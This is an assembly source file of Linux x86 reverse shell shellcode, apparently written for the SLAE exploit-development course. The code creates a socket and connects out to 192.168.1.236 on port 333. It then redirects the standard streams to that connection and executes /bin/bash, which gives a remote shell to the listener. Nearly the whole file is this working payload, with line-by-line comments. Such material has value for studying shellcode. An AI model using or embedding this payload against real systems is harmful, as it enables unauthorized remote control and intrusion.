; Filename: reverse.nasm
; Author:   Jake
; Website:  http://github.com/14deep
; Purpose:  Reverse shell shellcode for Linux x86 for the SLAE course


global _start			

section .text
_start:

	;Clearing the registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor esi, esi

	;Socket Calls
        ;In reverse order, pushing each value to the stack:

	;Socket - creating the socket
	push eax     ; Pushing 0 for the Protocol parameter required
	push 0x1     ; Pushing 1 for the Type (SOCK_STREAM) parameter required
	push 0x2     ; Pushing 2 for the Domain (IF_INET) parameter required
	
	mov al, 0x66 ; Adding syscall for socketcall() to eax
	mov bl, 0x1  ; 0x1 is added to bx for the socketcall parameter 'socket'

		     ; At this point, eax is set to 0x66 for the socketcall
		     ; syscall, ebx is set to 0x1 for the socket parameter
		     ; and ecx will contain the values that were pushed to 
		     ; the stack. 

	mov ecx, esp ; Moving the pointer to the stack into ecx for the final
		     ; parameters

	int 0x80     ; Interupt to call the syscall

	mov edx, eax ; Moving the File Descriptor return value to edx




    	;Connect - Connect outbound
    	mov al, 0x66 ; For Socketcall
    	mov bl, 0x3  ; For Connect
    
    	;need to push values to the stack to satisfy the following:
    	;int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	; What is needed is:
	; 1. The File Descriptor returned from the socket (edx)
	; 2. The sockaddr structure, found in 'man 7 ip'
	; 3. The addrlen, this will use the stack pointer

	;What the stack would be like:
	;
	;0x6 edx	-FD from socket call
	;0x5 *0x3	-Pointer to 0x3
	;0x4 0x10	-addrlen set to 16 bytes
	;0x3 0x02	-2 IF_INET
	;0x2 0x4d01	-The port (333)
	;0x1 0xec01	-IP address dword
	;0x0 0xa8c0	-IP address dword
	;
	;ecx contains pointer to the struct -- 0x3
	;ecx contains 0x6


    

	;sockaddr structure
	;           struct sockaddr_in {
        ;      sa_family_t    sin_family; /* address family: AF_INET */
        ;      in_port_t      sin_port;   /* port in network byte order */
        ;       struct in_addr sin_addr;   /* internet address */
        ;   };



	push dword 0xec01a8c0 ; Bytes in reverse order (endianness) c0(192).a8(168).01(1).ec(236)
	push word 0x4d01      ; The port to use, in this case 333 - 0x014d
	push word 0x2	      ; Always 2 for IF_INET
	
	;addrlen
	mov ecx, esp ; Moving the stack pointer to ecx to point to sockaddr structure dynamically
	push 0x10    ; Push addrlen to the stack, of the structure below. This is 16 bytes


	push ecx     ; The stack pointer which is pointing to the sockaddr struct pushed earlier
	push edx     ; File Descriptor from socket call to satisfy (1.)
	
	mov ecx, esp ; The previous value of ecx was pushed to the stack a few instructions before, this updates
		     ; ecx with the current stack pointer to the values previously pushed to the stack. 

	int 0x80     ; Interupt to call the syscall
	
	
	
	
	


	;dup2 - duplicate the file descriptor to redirect the incoming connection 
	;Note - this could be looped if required

	mov al, 0x3f  ; Syscall for dup2
	mov ebx, edx  ; Moving the old FD into ebx
	mov ecx, esi  ; Moving 0 into ecx for 'stdin'
	int 0x80      ; Interupt to call the syscall

	mov al, 0x3f
   	inc ecx       ; Increment ecx so it is now 2
    	int 0x80      ; Interupt to call the syscall

	mov al, 0x3f
	inc ecx       ; Increment ecx so it is now 2
    	int 0x80      ; Interupt to call the syscall
	

	;execve - execute '/bin/bash' to provide a shell

    	xor eax, eax  ; Clearing eax
    	push eax      ; Pushing 0 to the stack

   	; push////bin/bash (12), could be shortened to //bin/sh (8)
    	push 0x68736162
   	push 0x2f6e6962
    	push 0x2f2f2f2f

    	mov ebx, esp ; Move stack pointer pointing to the above to ebx as a parameter (filename)
	
	xor ecx, ecx ; Null pointer for ecx argv
	xor edx, edx ; Null pointer for edx envp

    	mov al, 0xb   ; Moving 11 to eax for execve syscall
    	int 0x80      ; Interupt to call the syscall
